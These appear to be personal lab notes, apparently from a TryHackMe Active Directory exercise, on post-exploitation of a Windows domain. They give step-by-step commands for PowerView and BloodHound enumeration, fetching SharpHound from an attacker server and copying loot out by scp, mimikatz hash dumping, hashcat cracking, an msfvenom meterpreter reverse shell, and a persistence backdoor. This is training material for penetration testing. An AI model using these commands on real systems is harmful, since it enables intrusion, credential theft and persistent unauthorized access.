**Enumeration with Powerview**  
Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.
 
1.) **powershell -ep bypass** -ep bypasses the execution policy of powershell allowing you to easily run scripts  
2.) Start PowerView - **. .\Downloads\PowerView.ps1**  
3.) Enumerate the domain users - **Get-NetUser | select cn**  
4.) Enumerate the domain groups - **Get-NetGroup -GroupName *admin***
 
Here's a cheatsheet to help you with commands: [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
Invoke-ShareFinder (to seach for shares)  
Get-NetComputer -fulldata | select operatingsystem (search for OS's running on network)
 
**Enumeration with Bloodhound**  
Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.
 
**Installing bloodhound:**  
1.) apt-get install bloodhound  
2.) neo4j console - default credentials -> neo4j:neo4j
 
To get sharphound.exe on target machine, use powershell to wget from local python server:  
wget [http://10.2.29.79:8888/SharpHound.exe](http://10.2.29.79:8888/SharpHound.exe) -Outfile SharpHound.exe
 
**Getting loot w/ SharpHound -**  
1.) powershell -ep bypass (same as with PowerView)  
2.) . .\Downloads\SharpHound.exe (don't use .ps1, it is outdated)  
3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip  
4.) Transfer the loot.zip folder to your Attacker Machine  
note: you can use scp to transfer the file if you’re using ssh (scp FILE kali@10.2.29.79:/tmp/)  
(might have to turn on ssh: sudo service ssh start)
 
**Mapping the network w/ BloodHound -**  
1.) bloodhound Run this on your attacker machine not the victim machine  
2.) Sign In using the same credentials you set with Neo4j  
3.) Inside of Bloodhound search for this icon and import the loot.zip folder  
note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files  
4.) To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.
 
(if you cant access the default database (bolt://localhost:7687) then in shell:  
neo4j console (to see which interface its running, prob localhost:7474)  
login to that address on web  
connect to the database  
return to blood hound GUI: DB=bolt://localhost:7687)
 
*Also ensure you have **neo4j console** running in shell,  
and are connected in the browser to localhost:7474  
before dragging the .zip file into bloodhound GUI.
 
**Dump Hashes w/ mimikatz -**  
1.) cd Downloads && mimikatz.exe this will cd into the directory that mimikatz is kept as well as run the mimikatz binary  
2.) privilege::debug ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly  
3.) lsadump::lsa /patch Dump those hashes!
 
Crack those hashes w/ hashcat﻿  
1.) hashcat -m 1000 <hash> rockyou.txt
 
**Enumeration w/ Server Manager -**  
This is what Windows Server Manager will look when you first open it up the main tabs that will be most interesting are the **tools** and **manage** tabs **the tools tab is where you will find most of your information such as users, groups, trusts, computers**. **The manage tab will allow you to add roles and features** however this will probably get picked up by a systems admin relatively quick.
 
Dont worry about the AD CS, AD DS, DNS, or File and Storage Services these are setup for exploitation of the active directory and dont have much use for post-exploitation
 
Navigate to the **tools tab and select the Active Directory Users and Computers**
 
This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers
 
Some sys admins dont realize that you as an attacker can see the descriptions of user accounts **so they may set the service accounts passwords inside of the description** look into the description and find what the SQL Service password is. **Event Viewer** for seeing login logs.
 
**Generating a Payload w/ msfvenom**﻿
 
1.) **msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe** this will generate a basic windows meterpreter reverse tcp shell  
2.) Transfer the payload from your attacker machine to the target machine.  
3.) **use exploit/multi/handler** - this will create a listener on the port that you set it on.  
4.) Configure our payload to be a windows meterpreter shell: **set payload windows/meterpreter/reverse_tcp**  
5.) After setting your THM IP address as your "LHOST", start the listener with run  
6.) Executing the binary on the windows machine will give you a meterpreter shell back on your host - let's return to that  
7.) Verify that we've got a meterpreter shell, where we will then background it to run the persistence module.
 
**Run the Persistence Module -**  
1.) **use exploit/windows/local/persistence** this module will send a payload every 10 seconds in default however you can set this time to anything you want  
2.) **set session 1** set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)
 
If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.
 
Here you can see the session die however the second we run the handler again we get a meterpreter shell back thanks to the persistence service.
 
There are other ways of maintaining access such as adding users and rootkits however I will leave you to do your own research and labs on those topics.
 
Hashed passwords in SAM

![How Hash Passwords Are Stored in Windows SAM? Password hash using LM/NTLM Shiela/tegt : OCB6948805F797BF2A82807973B89537 : : : Administrator: SOO:NO PASSWORD* : 61880B9EE37347SCB148A710BACB3031: : : *Amin: 1001 : : : Martin : 1002:NO :BF4AS02DA294ACBC17SB394A080DEE79: : : Juggyboy: 1003 PASSWORD" : 48BCDCDD222S3i2793ED6967B28C102S: : : Jason: 1004:NO : 2D20D2S2A479F48SCDFSE171D9398SBF: : : C EH Usernæne User ID LM Hash NTLM "LM hashes have been disabled in Windows Vista and later Windows operating systems. LM will be blank in those systems." ](Exported%20image%2020250424155748-0.png)